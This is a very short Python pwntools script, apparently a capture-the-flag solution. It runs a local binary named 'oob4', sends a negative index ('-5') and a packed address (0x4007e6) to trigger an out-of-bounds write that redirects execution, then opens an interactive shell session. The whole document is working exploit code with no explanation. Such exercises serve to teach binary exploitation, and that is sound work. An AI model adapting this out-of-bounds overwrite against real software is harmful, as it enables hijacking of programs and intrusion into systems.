from pwn import *
sh=process("./oob4")

sh.sendline("-5")
sh.sendline(p64(0x4007e6))
sh.interactive()
